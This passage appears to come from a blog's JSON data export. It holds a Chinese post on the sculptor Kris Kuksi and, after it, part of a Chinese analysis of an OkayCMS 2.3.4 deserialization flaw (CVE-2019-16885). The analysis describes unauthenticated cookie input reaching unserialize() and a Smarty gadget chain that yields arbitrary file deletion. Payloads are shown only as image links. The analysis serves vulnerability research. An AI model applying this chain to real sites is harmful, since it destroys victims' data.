8.jpg%}</div><div align=\"center\"><font color=#A9A9A9>手持机枪的战神</div></font> \n他出生于1973年，在密苏里的春田镇，但是他在堪萨斯长大，他自小孤僻，堪萨斯开阔而孤独的的乡间生活给了他足够的相像土壤，他喜欢画画，成年以后立刻发现他的艺术趣味和美国流行艺术和生活格格不入，他感到自己完全属于一个旧世界，这个旧世界不断被新时代的战争，破坏和暴力侵占蚕食，就像是拜伦所说：当斗兽场倒塌，罗马就会崩溃，当罗马崩溃，世界就崩溃了。\n<div align=\"center\">{% asset_img 7.jpg%}<font color=#A9A9A9>壁饰</font> </div>\nKuksi的斗兽场已经在他童年的时候被继父的酒瓶子砸倒了，这种塌陷一直就没有停顿。从2004年开始他创作《寄生和宿主》系列作品，从那时候开始他找到了自己的话语，在他看来今天的世界被贪婪的物质主义驱动，在这个邪恶而快速变换花样的世界中，选择传统而费时的注重细节的雕塑是如此需要勇气和耐心。\n<div align=\"center\">{% asset_img 6.jpg%}<font color=#A9A9A9>将鼠标光标移离缩略图窗口。</font> </div>\n“今天的世界对于需要长时间制作的艺术是不合适的，想和做都需要时间，周围的世界变化迅速这都是挑战，我只是不断适应这个时间，不论它对于艺术家来说是多么冷酷，艺术市场既有好处也有坏处，艺术的价值和以前的世纪比已经很廉价了。”他说道。\n<div align=\"center\">{% asset_img 10.jpg%}</div><div align=\"center\"><font color=#A9A9A9>对贝多芬的致敬</div></font> \n他说：“在艺术是什么或是伟大的艺术应该怎样的问题上，人们认知相差甚远，因此作为艺术家的我，我必须诚实面对自己的品味，并顶住压力去探索过去和未来的艺术趋势”\n","source":"_posts/kris.md","raw":"---\ntitle: 预言与狂想——后工业洛可可风格雕塑\ndate: 2017-05-20 09:06:49\ntags: 杂文\ncategories: 日常\n---\n<div align=\"center\">{% asset_img 0.jpg%}</div>\n如果你看过《黑帆》(Black Sails)这部美剧，一定会被其片头曲所震撼：沉闷的的光怪陆离的怪诞配乐；黑色的金属，白色的理石与昏暗的光线的碰撞；生者与死者的厮杀；在咚咚的鼓点声中压抑与振奋的奇怪体验。  \n我很喜欢片头曲中雕塑的风格，却一直不知道它们是什么，直到我偶然发现了雕塑家Kris Kuksi这个人。  \n\n这里收集了一些他的作品图片，快来一起体验下这些画风怪诞的艺术品吧。\n<!--more-->\n\n<div align=\"center\">{% asset_img 4.jpg%}<font color=#A9A9A9>安宁</font> </div>\nKris Kuksi 1973年3月2日出生在密苏里斯普林菲尔德， 他的母亲是一位蓝领.二个哥哥、空旷环境、稀稀落落的树和醺酒的继父，为他的想像力和个性铺平了道路。他异常迷恋艺术，奇异风格对他来讲是美丽的。  \n童年消极的生活环境使他在艺术取得了突破性进展，同时也使他厌恶美国生活和流行文化，他决定在“旧世界”里寻找着自己的东西！他希望他的艺术暴露人的虚伪，揭幕一个新的水平视角。\n<div align=\"center\">{% asset_img 1.jpg%}<font color=#A9A9A9>造访</font> </div>\nKris Kuksi创作的灵感来自工业世界里那些复杂的机器、管子、网络、电报、提炼厂等等；  \n他以巴洛克和洛可可式的流动的优美，并且融入了一点古怪和恐怖元素，创作了这些令人吃惊和独特的雕塑作品。 \n<div align=\"center\">{% asset_img 2.jpg%}<font color=#A9A9A9>泰古</font> </div>\n雕塑家Kris Kuksi的作品中，往往充斥着些深邃噩梦般的元素，让人想到那些阴谋的主使。不过这仅仅是外表而已，Kris Kuksi的作品中渗透出的对于死亡和无望境地冷嘲热讽反而让人们感到他像是一个将火种带回人间的普罗米修斯的对立面，一个将恐怖带到人间英雄。他的作品并没有血腥的元素，而是一种弥漫着一种宗教感般沉重的气息。然而，一个好作品就应该是这样的。\n<div align=\"center\">{% asset_img 3.jpg%}<font color=#A9A9A9>银行战车</font> </div>\n在雕塑界多年来具有突破性的作品少而又少，看到他的作品可能令人想到大师Hieronymus Bosch的荒诞不经, Lovecraft的暗黑狂想, 以及H.R.GIGER的淫邪之美。\n<div align=\"center\">{% asset_img 5.jpg%}</div><div align=\"center\"><font color=#A9A9A9>洲际导弹</font> </div>\n他的雕塑作品融合东方西方的古典雕塑形式，但是将新时代的设计语言和观念与古典融合，由此我们看到的是一个具有古典形式美的外表下的荒诞现实。这种形式和内容之间的矛盾构成他艺术中的暗黑特点。  \n<div align=\"center\">{% asset_img 11.jpg%}</div><div align=\"center\"><font color=#A9A9A9>罗马帝王</div></font> \n他的作品很多表现的是死亡，阴暗，破坏，邪恶与宗教般的庄严，严谨相结合，他起家于绘画，平平淡淡，不知道那根神经东起了最繁杂的古典雕塑的形式，那些卷曲的花叶和手持机枪的战神，多到让人眼花缭乱的细节都充满工匠气味，但是就是这样的繁杂瞬间超越了现代雕塑的冷漠和枯燥\n<div align=\"center\">{% asset_img 8.jpg%}</div><div align=\"center\"><font color=#A9A9A9>手持机枪的战神</div></font> \n他出生于1973年，在密苏里的春田镇，但是他在堪萨斯长大，他自小孤僻，堪萨斯开阔而孤独的的乡间生活给了他足够的相像土壤，他喜欢画画，成年以后立刻发现他的艺术趣味和美国流行艺术和生活格格不入，他感到自己完全属于一个旧世界，这个旧世界不断被新时代的战争，破坏和暴力侵占蚕食，就像是拜伦所说：当斗兽场倒塌，罗马就会崩溃，当罗马崩溃，世界就崩溃了。\n<div align=\"center\">{% asset_img 7.jpg%}<font color=#A9A9A9>壁饰</font> </div>\nKuksi的斗兽场已经在他童年的时候被继父的酒瓶子砸倒了，这种塌陷一直就没有停顿。从2004年开始他创作《寄生和宿主》系列作品，从那时候开始他找到了自己的话语，在他看来今天的世界被贪婪的物质主义驱动，在这个邪恶而快速变换花样的世界中，选择传统而费时的注重细节的雕塑是如此需要勇气和耐心。\n<div align=\"center\">{% asset_img 6.jpg%}<font color=#A9A9A9>将鼠标光标移离缩略图窗口。</font> </div>\n“今天的世界对于需要长时间制作的艺术是不合适的，想和做都需要时间，周围的世界变化迅速这都是挑战，我只是不断适应这个时间，不论它对于艺术家来说是多么冷酷，艺术市场既有好处也有坏处，艺术的价值和以前的世纪比已经很廉价了。”他说道。\n<div align=\"center\">{% asset_img 10.jpg%}</div><div align=\"center\"><font color=#A9A9A9>对贝多芬的致敬</div></font> \n他说：“在艺术是什么或是伟大的艺术应该怎样的问题上，人们认知相差甚远，因此作为艺术家的我，我必须诚实面对自己的品味，并顶住压力去探索过去和未来的艺术趋势”\n","slug":"kris","published":1,"updated":"2019-09-24T07:15:14.967Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckgrozu9m003zwsa9hogq9i5l","content":"<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/0.jpg\" class=\"\"></div>\n如果你看过《黑帆》(Black Sails)这部美剧，一定会被其片头曲所震撼：沉闷的的光怪陆离的怪诞配乐；黑色的金属，白色的理石与昏暗的光线的碰撞；生者与死者的厮杀；在咚咚的鼓点声中压抑与振奋的奇怪体验。  \n我很喜欢片头曲中雕塑的风格，却一直不知道它们是什么，直到我偶然发现了雕塑家Kris Kuksi这个人。  \n\n<p>这里收集了一些他的作品图片，快来一起体验下这些画风怪诞的艺术品吧。</p>\n<a id=\"more\"></a>\n\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/4.jpg\" class=\"\"><font color=#A9A9A9>安宁</font> </div>\nKris Kuksi 1973年3月2日出生在密苏里斯普林菲尔德， 他的母亲是一位蓝领.二个哥哥、空旷环境、稀稀落落的树和醺酒的继父，为他的想像力和个性铺平了道路。他异常迷恋艺术，奇异风格对他来讲是美丽的。  \n童年消极的生活环境使他在艺术取得了突破性进展，同时也使他厌恶美国生活和流行文化，他决定在“旧世界”里寻找着自己的东西！他希望他的艺术暴露人的虚伪，揭幕一个新的水平视角。\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/1.jpg\" class=\"\"><font color=#A9A9A9>造访</font> </div>\nKris Kuksi创作的灵感来自工业世界里那些复杂的机器、管子、网络、电报、提炼厂等等；  \n他以巴洛克和洛可可式的流动的优美，并且融入了一点古怪和恐怖元素，创作了这些令人吃惊和独特的雕塑作品。 \n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/2.jpg\" class=\"\"><font color=#A9A9A9>泰古</font> </div>\n雕塑家Kris Kuksi的作品中，往往充斥着些深邃噩梦般的元素，让人想到那些阴谋的主使。不过这仅仅是外表而已，Kris Kuksi的作品中渗透出的对于死亡和无望境地冷嘲热讽反而让人们感到他像是一个将火种带回人间的普罗米修斯的对立面，一个将恐怖带到人间英雄。他的作品并没有血腥的元素，而是一种弥漫着一种宗教感般沉重的气息。然而，一个好作品就应该是这样的。\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/3.jpg\" class=\"\"><font color=#A9A9A9>银行战车</font> </div>\n在雕塑界多年来具有突破性的作品少而又少，看到他的作品可能令人想到大师Hieronymus Bosch的荒诞不经, Lovecraft的暗黑狂想, 以及H.R.GIGER的淫邪之美。\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/5.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>洲际导弹</font> </div>\n他的雕塑作品融合东方西方的古典雕塑形式，但是将新时代的设计语言和观念与古典融合，由此我们看到的是一个具有古典形式美的外表下的荒诞现实。这种形式和内容之间的矛盾构成他艺术中的暗黑特点。  \n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/11.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>罗马帝王</div></font> \n他的作品很多表现的是死亡，阴暗，破坏，邪恶与宗教般的庄严，严谨相结合，他起家于绘画，平平淡淡，不知道那根神经东起了最繁杂的古典雕塑的形式，那些卷曲的花叶和手持机枪的战神，多到让人眼花缭乱的细节都充满工匠气味，但是就是这样的繁杂瞬间超越了现代雕塑的冷漠和枯燥\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/8.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>手持机枪的战神</div></font> \n他出生于1973年，在密苏里的春田镇，但是他在堪萨斯长大，他自小孤僻，堪萨斯开阔而孤独的的乡间生活给了他足够的相像土壤，他喜欢画画，成年以后立刻发现他的艺术趣味和美国流行艺术和生活格格不入，他感到自己完全属于一个旧世界，这个旧世界不断被新时代的战争，破坏和暴力侵占蚕食，就像是拜伦所说：当斗兽场倒塌，罗马就会崩溃，当罗马崩溃，世界就崩溃了。\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/7.jpg\" class=\"\"><font color=#A9A9A9>壁饰</font> </div>\nKuksi的斗兽场已经在他童年的时候被继父的酒瓶子砸倒了，这种塌陷一直就没有停顿。从2004年开始他创作《寄生和宿主》系列作品，从那时候开始他找到了自己的话语，在他看来今天的世界被贪婪的物质主义驱动，在这个邪恶而快速变换花样的世界中，选择传统而费时的注重细节的雕塑是如此需要勇气和耐心。\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/6.jpg\" class=\"\"><font color=#A9A9A9>将鼠标光标移离缩略图窗口。</font> </div>\n“今天的世界对于需要长时间制作的艺术是不合适的，想和做都需要时间，周围的世界变化迅速这都是挑战，我只是不断适应这个时间，不论它对于艺术家来说是多么冷酷，艺术市场既有好处也有坏处，艺术的价值和以前的世纪比已经很廉价了。”他说道。\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/kris/10.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>对贝多芬的致敬</div></font> \n他说：“在艺术是什么或是伟大的艺术应该怎样的问题上，人们认知相差甚远，因此作为艺术家的我，我必须诚实面对自己的品味，并顶住压力去探索过去和未来的艺术趋势”\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2020/08/image-228-570x456.png","excerpt":"<div align=\"center\"><img src=\"/kris/0.jpg\" class=\"\"></div>\n如果你看过《黑帆》(Black Sails)这部美剧，一定会被其片头曲所震撼：沉闷的的光怪陆离的怪诞配乐；黑色的金属，白色的理石与昏暗的光线的碰撞；生者与死者的厮杀；在咚咚的鼓点声中压抑与振奋的奇怪体验。  \n我很喜欢片头曲中雕塑的风格，却一直不知道它们是什么，直到我偶然发现了雕塑家Kris Kuksi这个人。  \n\n<p>这里收集了一些他的作品图片，快来一起体验下这些画风怪诞的艺术品吧。</p>","more":"<div align=\"center\"><img src=\"/kris/4.jpg\" class=\"\"><font color=#A9A9A9>安宁</font> </div>\nKris Kuksi 1973年3月2日出生在密苏里斯普林菲尔德， 他的母亲是一位蓝领.二个哥哥、空旷环境、稀稀落落的树和醺酒的继父，为他的想像力和个性铺平了道路。他异常迷恋艺术，奇异风格对他来讲是美丽的。  \n童年消极的生活环境使他在艺术取得了突破性进展，同时也使他厌恶美国生活和流行文化，他决定在“旧世界”里寻找着自己的东西！他希望他的艺术暴露人的虚伪，揭幕一个新的水平视角。\n<div align=\"center\"><img src=\"/kris/1.jpg\" class=\"\"><font color=#A9A9A9>造访</font> </div>\nKris Kuksi创作的灵感来自工业世界里那些复杂的机器、管子、网络、电报、提炼厂等等；  \n他以巴洛克和洛可可式的流动的优美，并且融入了一点古怪和恐怖元素，创作了这些令人吃惊和独特的雕塑作品。 \n<div align=\"center\"><img src=\"/kris/2.jpg\" class=\"\"><font color=#A9A9A9>泰古</font> </div>\n雕塑家Kris Kuksi的作品中，往往充斥着些深邃噩梦般的元素，让人想到那些阴谋的主使。不过这仅仅是外表而已，Kris Kuksi的作品中渗透出的对于死亡和无望境地冷嘲热讽反而让人们感到他像是一个将火种带回人间的普罗米修斯的对立面，一个将恐怖带到人间英雄。他的作品并没有血腥的元素，而是一种弥漫着一种宗教感般沉重的气息。然而，一个好作品就应该是这样的。\n<div align=\"center\"><img src=\"/kris/3.jpg\" class=\"\"><font color=#A9A9A9>银行战车</font> </div>\n在雕塑界多年来具有突破性的作品少而又少，看到他的作品可能令人想到大师Hieronymus Bosch的荒诞不经, Lovecraft的暗黑狂想, 以及H.R.GIGER的淫邪之美。\n<div align=\"center\"><img src=\"/kris/5.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>洲际导弹</font> </div>\n他的雕塑作品融合东方西方的古典雕塑形式，但是将新时代的设计语言和观念与古典融合，由此我们看到的是一个具有古典形式美的外表下的荒诞现实。这种形式和内容之间的矛盾构成他艺术中的暗黑特点。  \n<div align=\"center\"><img src=\"/kris/11.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>罗马帝王</div></font> \n他的作品很多表现的是死亡，阴暗，破坏，邪恶与宗教般的庄严，严谨相结合，他起家于绘画，平平淡淡，不知道那根神经东起了最繁杂的古典雕塑的形式，那些卷曲的花叶和手持机枪的战神，多到让人眼花缭乱的细节都充满工匠气味，但是就是这样的繁杂瞬间超越了现代雕塑的冷漠和枯燥\n<div align=\"center\"><img src=\"/kris/8.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>手持机枪的战神</div></font> \n他出生于1973年，在密苏里的春田镇，但是他在堪萨斯长大，他自小孤僻，堪萨斯开阔而孤独的的乡间生活给了他足够的相像土壤，他喜欢画画，成年以后立刻发现他的艺术趣味和美国流行艺术和生活格格不入，他感到自己完全属于一个旧世界，这个旧世界不断被新时代的战争，破坏和暴力侵占蚕食，就像是拜伦所说：当斗兽场倒塌，罗马就会崩溃，当罗马崩溃，世界就崩溃了。\n<div align=\"center\"><img src=\"/kris/7.jpg\" class=\"\"><font color=#A9A9A9>壁饰</font> </div>\nKuksi的斗兽场已经在他童年的时候被继父的酒瓶子砸倒了，这种塌陷一直就没有停顿。从2004年开始他创作《寄生和宿主》系列作品，从那时候开始他找到了自己的话语，在他看来今天的世界被贪婪的物质主义驱动，在这个邪恶而快速变换花样的世界中，选择传统而费时的注重细节的雕塑是如此需要勇气和耐心。\n<div align=\"center\"><img src=\"/kris/6.jpg\" class=\"\"><font color=#A9A9A9>将鼠标光标移离缩略图窗口。</font> </div>\n“今天的世界对于需要长时间制作的艺术是不合适的，想和做都需要时间，周围的世界变化迅速这都是挑战，我只是不断适应这个时间，不论它对于艺术家来说是多么冷酷，艺术市场既有好处也有坏处，艺术的价值和以前的世纪比已经很廉价了。”他说道。\n<div align=\"center\"><img src=\"/kris/10.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>对贝多芬的致敬</div></font> \n他说：“在艺术是什么或是伟大的艺术应该怎样的问题上，人们认知相差甚远，因此作为艺术家的我，我必须诚实面对自己的品味，并顶住压力去探索过去和未来的艺术趋势”"},{"title":"OkayCMS 2.3.4 反序列化漏洞(CVE-2019-16885)","date":"2019-12-10T09:08:32.000Z","categorise":"技术","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nOKAYCMS是一款来自俄罗斯的功能强大的在线商店管理系统。OKAYCMS易于定制的多种语言自适应模板可用于销售任何商品：从服装、建筑材料、手机到音乐曲目，视频课程，有声读物和海报等。\n\n在OKAYCMS v2.3.4中存在着一处反序列化漏洞。未经身份验证的攻击者可以通过此处漏洞进行进一步的攻击利用。\n\n<!--more-->\n\n漏洞细节\n--------\n\n漏洞位置存在于view/ProductsView.php与api/Comparison.php代码中，可以通过Cookie传入序列化代码进行利用\n\n首先来看下第一处，即位于view/ProductsView.php 516行处代码\n\n![QBqgG6.png](https://s2.ax1x.com/2019/12/10/QBqgG6.png)\n\n可见位于上图代码中存在一处unserialize方法，此处unserialize位于ProductsView.php中fetch方法中，此处代码将cookie中传入的price_filter参数未经过滤，直接反序列化，从而产生了漏洞\n\n更加严重的是：由于ProductsView.php并未对fetch方法进行身份校验，未经身份验证的用户可以将恶意的cookie传递到此处执行\n\n我们构造如下get请求，将恶意字符串”test”通过cookie中price_filter参数传递给反序列化漏洞点\n\n![QBqcPx.png](https://s2.ax1x.com/2019/12/10/QBqcPx.png)\n\n后台断点处，可见unserialize函数成功接收到我们在cookie中传递的字符串”test”\n\n![QBqRxO.png](https://s2.ax1x.com/2019/12/10/QBqRxO.png)\n\n再来看下api/Comparison.php文件\n\napi/Comparison.php文件中多次利用unserialize函数将cookie中传入的comparison参数进行反序列化操作，具体如下：\n\n用于选择比较产品清单的get_comparison接口处\n\n![QBqFDH.png](https://s2.ax1x.com/2019/12/10/QBqFDH.png)\n\n用于将产品添加到比较列表的add_item接口处\n\n![QBq9gO.png](https://s2.ax1x.com/2019/12/10/QBq9gO.png)\n\n用于从比较列表中删除项目的delete_item接口处\n\n![QBqtP0.png](https://s2.ax1x.com/2019/12/10/QBqtP0.png)\n\n以上这些存在反序列化漏洞的接口，同样也是不需要身份验证就可以访问\n\n在ajax/comparison.php中，get_comparison、add_item与delete_item是可以直接被调用而不需要身份验证的，代码如下：\n\n![QBqyI1.png](https://s2.ax1x.com/2019/12/10/QBqyI1.png)\n\n上图代码可见，只要通过get请求中的action参数即可控制所要使用的接口，但是程序并未进行身份校验\n\n我们以get_comparison接口举例\n\n我们构造如下get请求，将恶意字符串”test”通过cookie中comparison参数传递给反序列化漏洞点\n\n![QBbx4x.png](https://s2.ax1x.com/2019/12/10/QBbx4x.png)\n\n可见我们将构造的cookie中的comparison参数值“test”成功传递给了unserialize函数\n\n![QBqkbd.png](https://s2.ax1x.com/2019/12/10/QBqkbd.png)\n\n此时，反序列化利用点已经找到了，但是仍需要利用链才能进行利用\n\n### 任意文件删除利用链\n\n经过分析可以发现，OKAYCMS是一款使用Smarty模板引擎进行开发的cms。因此可以使用Smarty中的利用链进行利用\n\n在Smarty模板引擎中存在smarty_internal_cacheresource_file.php文件，该文件定义了一个名为Smarty_Internal_CacheResource_File的类。在Smarty_Internal_CacheResource_File类中存在一处releaseLock方法，如下图\n\n![QBqCvD.png](https://s2.ax1x.com/2019/12/10/QBqCvD.png)\n\n可见上图releaseLock方法中，存在一处unlink方法，利用该方法，可以进行文件删除操作\n\n注意看下图这里两处红框\n\n![QBbvU1.png](https://s2.ax1x.com/2019/12/10/QBbvU1.png)\n\n方法releaseLock接收两个参数，分别是Smarty \\$smarty与 Smarty_Template_Cached\n\\$cached\n\nSmarty 与 Smarty_Template_Cached分别是Smarty模板引擎中两个类的名称\n\nSmarty类\n\n![QBqsaR.png](https://s2.ax1x.com/2019/12/10/QBqsaR.png)\n\nSmarty_Template_Cached类\n\n![QBqGan.png](https://s2.ax1x.com/2019/12/10/QBqGan.png)\n\n这里类名+参数名的用法是什么呢？\n\n在php中，这种用法叫做类型约束，详细的解释如下：\n\nPHP5以及以上版本可以使用类型约束。函数的参数可以指定必须为对象（在函数原型里面指定类的名字），接口，数组（PHP5.1 起）或者 callable（PHP 5.4 起）。不过如果使用 NULL作为参数的默认值，那么在调用函数的时候依然可以使用 NULL 作为实参。\n\n如果一个类或接口指定了类型约束，则其所有的子类或实现也都如此。类型约束不能用于标量类型如\nint 或 string，Traits 也不允许。\n\n下面举个例子说明一下类型约束用法：\n\n![QBqrZ9.png](https://s2.ax1x.com/2019/12/10/QBqrZ9.png)\n\n有名为MyClass与OtherClass的两个类，MyClass类中的test方法接收OtherClass\n类的一个对象作为参数，并打印出该对象的var属性值\n\n当传入\\$myclass-\\>test值为字符串hello时\n\n![QBq8Vs.png](https://s2.ax1x.com/2019/12/10/QBq8Vs.png)\n\n报出上图错误：传递给MyClass :: test（）的参数1必须是OtherClass的实例\n\n当传入\\$myclass-\\>test值为\\$otherclass即OtherClass类的实例时\n\n![QBqlrQ.png](https://s2.ax1x.com/2019/12/10/QBqlrQ.png)\n\n程序打印出Hello World\n\n在弄清楚php类型约束概念之后，回到正文：\n\n![](C:/Users/grq/Desktop/work/文章/披甲熊/OkayCMS 2.3.4 反序列化漏洞(CVE-2019-16885)/media/a407e48f16e590389d5ca93ad624feef.png)\n\n可见如果我们想构造反序列化利用链，使用这个releaseLock方法进行任意文件删除，那传入releaseLock方法中的两个参数必须为Smarty类与Smarty_Template_Cached类的实例\n\n在了解到releaseLock方法如何使用后，我们继续查找releaseLock方法是否在某个类的魔术方法中被调用，以便在反序列化操作时被调用\n\n经过搜索发现，在smarty_internal_template.php文件中定义了Smarty_Internal_Template类，该类的destruct方法见下图\n\n![QBq2RK.png](https://s2.ax1x.com/2019/12/10/QBq2RK.png)\n\n在Smarty_Internal_Template类destruct方法中，调用了releaseLock方法\n\n在Smarty_Internal_Template类destruct方法中，可见只要满足了if分支，就可以执行releaseLock方法\n\ndestruct方法中的releaseLock方法接收的两个参数\\$this-\\>smarty与\\$this-\\>cached，根据上文分析，\\$this-\\>smarty与\\$this-\\>cached需要为Smarty类与Smarty_Template_Cached类的实例，因此我们需要进行如下构造：\n\n![QBqNGV.png](https://s2.ax1x.com/2019/12/10/QBqNGV.png)\n\n为了顺利进入if分支，还需要使得\n\n\\$this-\\>smarty-\\>cache_locking / isset(\\$this-\\>cached) / $this-\\>cached-\\>is_locked三者为真\n\n\\$this-\\>cached已经设置为Smarty_Template_Cached类的实例，因此\\$this-\\>cached已经为真\n\n\\$this-\\>smarty是Smarty类的实例，要使得\\$this-\\>smarty-\\>cache_locking为真可见下图设置\n\n![QBq0r4.png](https://s2.ax1x.com/2019/12/10/QBq0r4.png)\n\n\\$this-\\>cached是Smarty_Template_Cached类的实例，要使得\\$this-\\>cached-\\>is_locked为真可见下图设置\n\n![QBqZ5t.png](https://s2.ax1x.com/2019/12/10/QBqZ5t.png)\n\n在成功进入if分支后，需要控制\\$this-\\>cached-\\>lock_id，这个变量用来进行文件删除\n\n\\$this-\\>cached是Smarty_Template_Cached类的实例，要设置\\$this-\\>cached-\\>lock_id的值可见下图设置\n\n![QBbOb9.png](https://s2.ax1x.com/2019/12/10/QBbOb9.png)\n\n最后完整的利用链如下\n\n![QBqn8f.png](https://s2.ax1x.com/2019/12/10/QBqn8f.png)\n\n当将构造好的序列化字符串通过cookie传入系统后，在反序列化时，将会将指定路径的文件进行删除，从而造成了任意文件删除漏洞","source":"_posts/okaycms.md","raw":"---\ntitle: OkayCMS 2.3.4 反序列化漏洞(CVE-2019-16885)\ndate: 2019-12-10 17:08:32\ntags: web漏洞分析\ncategorise: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nOKAYCMS是一款来自俄罗斯的功能强大的在线商店管理系统。OKAYCMS易于定制的多种语言自适应模板可用于销售任何商品：从服装、建筑材料、手机到音乐曲目，视频课程，有声读物和海报等。\n\n在OKAYCMS v2.3.4中存在着一处反序列化漏洞。未经身份验证的攻击者可以通过此处漏洞进行进一步的攻击利用。\n\n<!--more-->\n\n漏洞细节\n--------\n\n漏洞位置存在于view/ProductsView.php与api/Comparison.php代码中，可以通过Cookie传入序列化代码进行利用\n\n首先来看下第一处，即位于view/ProductsView.php 516行处代码\n\n![QBqgG6.png](https://s2.ax1x.com/2019/12/10/QBqgG6.png)\n\n可见位于上图代码中存在一处unserialize方法，此处unserialize位于ProductsView.php中fetch方法中，此处代码将cookie中传入的price_filter参数未经过滤，直接反序列化，从而产生了漏洞\n\n更加严重的是：由于ProductsView.php并未对fetch方法进行身份校验，未经身份验证的用户可以将恶意的cookie传递到此处执行\n\n我们构造如下get请求，将恶意字符串”test”通过cookie中price_filter参数传递给反序列化漏洞点\n\n![QBqcPx.png](https://s2.ax1x.com/2019/12/10/QBqcPx.png)\n\n后台断点处，可见unserialize函数成功接收到我们在cookie中传递的字符串”test”\n\n![QBqRxO.png](https://s2.ax1x.com/2019/12/10/QBqRxO.png)\n\n再来看下api/Comparison.php文件\n\napi/Comparison.php文件中多次利用unserialize函数将cookie中传入的comparison参数进行反序列化操作，具体如下：\n\n用于选择比较产品清单的get_comparison接口处\n\n![QBqFDH.png](https://s2.ax1x.com/2019/12/10/QBqFDH.png)\n\n用于将产品添加到比较列表的add_item接口处\n\n![QBq9gO.png](https://s2.ax1x.com/2019/12/10/QBq9gO.png)\n\n用于从比较列表中删除项目的delete_item接口处\n\n![QBqtP0.png](https://s2.ax1x.com/2019/12/10/QBqtP0.png)\n\n以上这些存在反序列化漏洞的接口，同样也是不需要身份验证就可以访问\n\n在ajax/comparison.php中，get_comparison、add_item与delete_item是可以直接被调用而不需要身份验证的，代码如下：\n\n![QBqyI1.png](https://s2.ax1x.com/2019/12/10/QBqyI1.png)\n\n上图代码可见，只要通过get请求中的action参数即可控制所要使用的接口，但是程序并未进行身份校验\n\n我们以get_comparison接口举例\n\n我们构造如下get请求，将恶意字符串”test”通过cookie中comparison参数传递给反序列化漏洞点\n\n![QBbx4x.png](https://s2.ax1x.com/2019/12/10/QBbx4x.png)\n\n可见我们将构造的cookie中的comparison参数值“test”成功传递给了unserialize函数\n\n![QBqkbd.png](https://s2.ax1x.com/2019/12/10/QBqkbd.png)\n\n此时，反序列化利用点已经找到了，但是仍需要利用链才能进行利用\n\n### 任意文件删除利用链\n\n经过分析可以发现，OKAYCMS是一款使用Smarty模板引擎进行开发的cms。因此可以使用Smarty中的利用链进行利用\n\n在Smarty模板引擎中存在smarty_internal_cacheresource_file.php文件，该文件定义了一个名为Smarty_Internal_CacheResource_File的类。在Smarty_Internal_CacheResource_File类中存在一处releaseLock方法，如下图\n\n![QBqCvD.png](https://s2.ax1x.com/2019/12/10/QBqCvD.png)\n\n可见上图releaseLock方法中，存在一处unlink方法，利用该方法，可以进行文件删除操作\n\n注意看下图这里两处红框\n\n![QBbvU1.png](https://s2.ax1x.com/2019/12/10/QBbvU1.png)\n\n方法releaseLock接收两个参数，分别是Smarty \\$smarty与 Smarty_Template_Cached\n\\$cached\n\nSmarty 与 Smarty_Template_Cached分别是Smarty模板引擎中两个类的名称\n\nSmarty类\n\n![QBqsaR.png](https://s2.ax1x.com/2019/12/10/QBqsaR.png)\n\nSmarty_Template_Cached类\n\n![QBqGan.png](https://s2.ax1x.com/2019/12/10/QBqGan.png)\n\n这里类名+参数名的用法是什么呢？\n\n在php中，这种用法叫做类型约束，详细的解释如下：\n\nPHP5以及以上版本可以使用类型约束。函数的参数可以指定必须为对象（在函数原型里面指定类的名字），接口，数组（PHP5.1 起）或者 callable（PHP 5.4 起）。不过如果使用 NULL作为参数的默认值，那么在调用函数的时候依然可以使用 NULL 作为实参。\n\n如果一个类或接口指定了类型约束，则其所有的子类或实现也都如此。类型约束不能用于标量类型如\nint 或 string，Traits 也不允许。\n\n下面举个例子说明一下类型约束用法：\n\n![QBqrZ9.png](https://s2.ax1x.com/2019/12/10/QBqrZ9.png)\n\n有名为MyClass与OtherClass的两个类，MyClass类中的test方法接收OtherClass\n类的一个对象作为参数，并打印出该对象的var属性值\n\n当传入\\$myclass-\\>test值为字符串hello时\n\n![QBq8Vs.png](https://s2.ax1x.com/2019/12/10/QBq8Vs.png)\n\n报出上图错误：传递给MyClass :: 